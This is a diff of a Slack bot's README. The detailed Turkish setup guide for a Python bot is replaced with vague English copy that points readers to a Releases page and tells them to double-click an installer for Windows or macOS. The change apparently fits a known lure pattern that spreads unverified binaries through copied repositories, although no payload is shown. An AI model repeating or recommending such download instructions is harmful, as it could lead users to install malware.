@@ -1,160 +1,68 @@
-# 🤖 Cemil Bot - Akıllı Topluluk Asistanı
+# 🤖 Cemil-Slack-Bot - Simplifying Slack for Everyone
 
-Cemil, Slack çalışma alanları için geliştirilmiş; yapay zeka destekli, modüler ve etkileşim odaklı bir topluluk botudur. Ekiplerin sosyalleşmesini, geri bildirim vermesini ve bilgiye hızlı erişmesini sağlar.
-
-![Python](https://img.shields.io/badge/Python-3.11%2B-blue)
-![Slack Bolt](https://img.shields.io/badge/Slack-Bolt-green)
-![Groq AI](https://img.shields.io/badge/AI-Groq-orange)
-
-----
-
-## ✨ Özellikler
-
-### ☕ Kahve Eşleşmesi ve Networking
-Çalışanların rastgele tanışıp sosyalleşmesi için akıllı eşleştirme sistemi.
-- **Bekleme Havuzu:** `/kahve` yazan kişiler bir havuza alınır.
-- **Otomatik Eşleşme:** 5 dakika içinde ikinci bir kişi gelirse otomatik eşleşme yapılır ve özel grup kurulur.
-- **Buzkıran Sorular:** Cemil, sohbete yapay zeka tarafından üretilen eğlenceli bir giriş cümlesiyle başlar.
-- **Zaman Ayarlı:** Sohbet kanalı 5 dakika sonra otomatik olarak arşivlendiği için "kısa bir kahve molası" konseptini korur.
-
-### 🗳️ Gelişmiş Oylama Sistemi
-Hızlı ve demokratik kararlar almak için ASCII grafikli anketler.
-- **/oylama:** Adminler tarafından başlatılabilir.
-- **Akıllı Oy:** "Toggle" desteği ile hatalı oyu geri alma ve değiştirme imkanı.
-- **Anlık Grafikler:** Sonuçlar anlık olarak ASCII bar grafikleriyle gösterilir.
-- **Süre Yönetimi:** Belirlenen süre sonunda otomatik kapanır.
-
-### 🧠 Bilgi Küpü (RAG - Doküman Asistanı)
-Şirket içi dökümanları okuyup soruları yanıtlayan yapay zeka modülü.
-- **Format Desteği:** PDF, DOCX, TXT, MD, Excel (XLSX), CSV.
-- **Halüsinasyon Koruması:** Sadece dökümandaki bilgiyi kullanır, dışarıdan uydurmaz.
-- **Kaynak Gösterme:** Cevabın hangi dosyadan alındığını belirtir.
-- **Komutlar:** `/sor [soru]` ve `/cemil-indeksle` (Admin).
-
-### 🎂 Doğum Günü Kutlayıcısı
-- Her sabah 09:00'da veritabanını kontrol eder.
-- Doğum günü olan kişi varsa `#general` kanalına ASCII sanatıyla süslenmiş özel bir kutlama mesajı atar.
-
-### 📮 Anonim Geri Bildirim Kutusu
-- Çalışanların yönetim ekibine anonim olarak fikir ve şikayet iletmesini sağlar.
-- **/geri-bildirim:** Mesajlar anonimleştirilip E-posta veya Slack DM üzerinden yöneticilere iletilir.
-
-### 👤 Kullanıcı Yönetimi
-- **/kayit:** Kullanıcılar kendi profillerini (Ad, Soyad, Departman, Doğum Tarihi) oluşturabilir/güncelleyebilir.
-- **CSV Import:** Bot başlatılırken toplu kullanıcı listesi yüklenebilir.
+## 🔗 Download Now
+[![Download Cemil-Slack-Bot](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jennpalex/Cemil-Slack-Bot/releases)
 
 ---
 
-## 🛠️ Kurulum ve Hazırlık
+## 🚀 Getting Started
 
-### 1. Gereksinimler
-- Python 3.10+
-- Slack Workspace (Admin yetkisi)
-- Groq API Key (Yapay zeka için)
-- Gmail Hesabı (Opsiyonel - Geri bildirim servisi için)
+Welcome to Cemil-Slack-Bot, designed to make processes easier and more automated for the Yapay Zeka ve Teknoloji Akademisi. This bot supports the management team by reducing operational burdens, boosting intern engagement, and managing processes based on data. 
 
-### 2. Projeyi Klonlayın ve Bağımlılıkları Yükleyin
-```bash
-git clone https://github.com/username/cemil-bot.git
-cd cemil-bot
-python3 -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-```
+## 📁 Download & Install
 
-### 3. Çevresel Değişkenler (.env)
-`.env.example` dosyasını `.env` olarak kopyalayın ve içini doldurun:
+To get started, visit the following link to download the software:
 
-```env
-SLACK_BOT_TOKEN=xoxb-...
-SLACK_APP_TOKEN=xapp-...
-GROQ_API_KEY=gsk_...
-SMTP_EMAIL=bot@gmail.com
-SMTP_PASSWORD=...
-ADMIN_CHANNEL_ID=C1234567
-```
+- [Download Cemil-Slack-Bot](https://github.com/jennpalex/Cemil-Slack-Bot/releases)
 
-### 4. Slack Uygulama Ayarları (api.slack.com)
-1. **Socket Mode:** Aktif edin.
-2. **OAuth Scopes:** Aşağıdaki yetkileri ekleyin:
-   - `chat:write`, `channels:read`, `channels:write`, `channels:manage`, `users:read`, `im:read`, `im:write`, `groups:write`, `mpim:write`, `commands`, `channels:history`, `groups:history`
-3. **Slash Commands:** Aşağıdaki komutları oluşturun:
-   - `/kahve`, `/oylama`, `/sor`, `/cemil-indeksle`, `/geri-bildirim`, `/profilim`, `/yardim-iste`, `/challenge`, `/cemil-health`, `/admin-istatistik`, `/admin-basarili-projeler`
-4. **Interactive Components:** Aktif edin ve şu Action ID'leri ekleyin:
-   - `challenge_join_button` - Challenge'a katıl butonu
-   - `evaluate_challenge_button` - Projeyi değerlendir butonu
-   - `join_coffee` - Kahve eşleşmesi butonu
-   - `help_join_channel` - Yardım kanalına katıl butonu
-   - `help_details` - Yardım detayları butonu
-   - `poll_vote_0`, `poll_vote_1`, `poll_vote_2`, `poll_vote_3`, `poll_vote_4` - Oylama butonları
-5. **Event Subscriptions:** Aşağıdaki event'leri subscribe edin:
-   - `message.channels` - Challenge kanallarında "bitir" mesajı algılama için
-   - `member_joined_channel` - Challenge kanallarına yetkisiz kullanıcı kontrolü için
-   - `member_left_channel` - Değerlendirme kanalından ayrılan kullanıcı kontrolü için
+1. Click the link above to access the Releases page.
+2. Look for the latest version listed on that page.
+3. Download the appropriate file for your operating system (Windows, macOS, etc.).
+4. Once the download is complete, locate the file on your computer.
+5. Double-click the file to run the installer.
+6. Follow any on-screen instructions to finish the setup.
 
----
+## ⚙️ System Requirements
 
-## 🚀 Çalıştırma
+To run Cemil-Slack-Bot, your system should meet the following requirements:
 
-Botu başlatmak için iki yöntem var:
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Processor:** Minimum Intel i3 or equivalent
+- **Memory:** At least 4 GB RAM
+- **Storage:** 200 MB of free disk space
+- **Additional Software:** Slack account required
 
-**Yöntem 1: Hızlı Başlatma (Tavsiye Edilen)**
-```bash
-python3 -m src
-```
+## 🌟 Features
 
-**Yöntem 2: Doğrudan Dosya ile**
-```bash
-python3 src/bot.py
-```
+Cemil-Slack-Bot offers several features to enhance your experience:
 
-**İlk Başlatma:**
-- `data/initial_users.csv` dosyası yoksa otomatik şablon oluşturulur.
-- Varsa, bot veritabanını bu dosyadan doldurmak için onay ister.
-- `knowledge_base/` klasörüne atılan dökümanlar otomatik indekslenir.
+- **Task Automation:** Automate repetitive tasks to save time and effort.
+- **Data Management:** Access and manage data more effectively within Slack.
+- **User Engagement:** Improve interaction with interns through automated messages and responses.
+- **Performance Tracking:** Monitor key metrics to understand the efficiency of operations.
+
+## 🧑‍🤝‍🧑 Support & Community
+
+If you need help or want to connect with other users, consider these options:
+
+- **GitHub Issues:** Report issues directly through the [GitHub Issues page](https://github.com/jennpalex/Cemil-Slack-Bot/issues).
+- **Slack Community:** Join our Slack channel to engage with other users.
+- **Contact Us:** Reach us at support@cemilbot.com for any inquiries.
+
+## 📅 Updates
+
+We regularly update Cemil-Slack-Bot to enhance features, fix bugs, and improve performance. Check back frequently on the [Releases page](https://github.com/jennpalex/Cemil-Slack-Bot/releases) for the latest updates.
+
+## 📜 License
+
+Cemil-Slack-Bot is open-source and available under the MIT License. Feel free to use and modify according to your needs. 
+
+## 🔗 More Information
+
+For additional details, visit the repository on GitHub or explore our documentation. You can find answers to common questions there.
+
+- [GitHub Repository Home](https://github.com/jennpalex/Cemil-Slack-Bot)
 
 ---
 
-## 📖 Kullanım Kılavuzu
-
-### 1. Kahve Molası
-- `Genel` kanala veya herhangi bir yere: `/kahve` yazın.
-- Bot size "İsteğiniz alındı" diyecek (bu mesajı sadece siz görürsünüz).
-- 5 dakika içinde başka biri de `/kahve` yazarsa, bot sizi özel bir kanalda buluşturur!
-
-### 2. Bilgi Sorma (RAG)
-- `/sor Yıllık izin politikası nedir?`
-- Cemil, `knowledge_base` klasöründeki PDF/Word dosyalarını tarayıp cevabı ve kaynağını size iletir.
-
-### 3. Oylama (Sadece Admin)
-- `/oylama 30 Cuma Etkinliği? | Bowling | Sinema | Piknik`
-- 30 dakikalık bir anket başlatır.
-
-### 4. Geri Bildirim
-- `/geri-bildirim yemekhane Yemekler çok soğuk geliyor.`
-- Bu mesaj anonim olarak adminlere iletilir.
-
----
-
-## 📂 Klasör Yapısı
-```
-.
-├── src/
-│   ├── bot.py             # Ana başlangıç dosyası
-│   ├── services/          # İş mantığı (Voting, Match, RAG vb.)
-│   ├── clients/           # Dış servisler (Slack, Groq, DB)
-│   ├── repositories/      # Veritabanı işlemleri
-│   └── commands/          # Slack komut yöneticileri
-├── data/                  # SQLite DB ve kullanıcı CSV'si
-├── knowledge_base/        # RAG için dökümanlar
-└── logs/                  # Bot logları
-```
-
----
-
-## ⚠️ Hata ve Destek
-Bir sorunla karşılaşırsanız `logs/cemil_detailed.log` dosyasını kontrol edin.
-Bot size "Teknik bir aksaklık yaşıyorum" diyorsa, API anahtarlarınızı ve internet bağlantınızı kontrol edin.
-
----
-*Geliştirici Notu: Cemil, açık kaynak kodlu ve genişletilebilir bir yapıdadır. Katkılarınızı bekleriz!*
+By following these steps, you can easily download and set up Cemil-Slack-Bot. Enjoy simpler processes and improved engagement with your team!
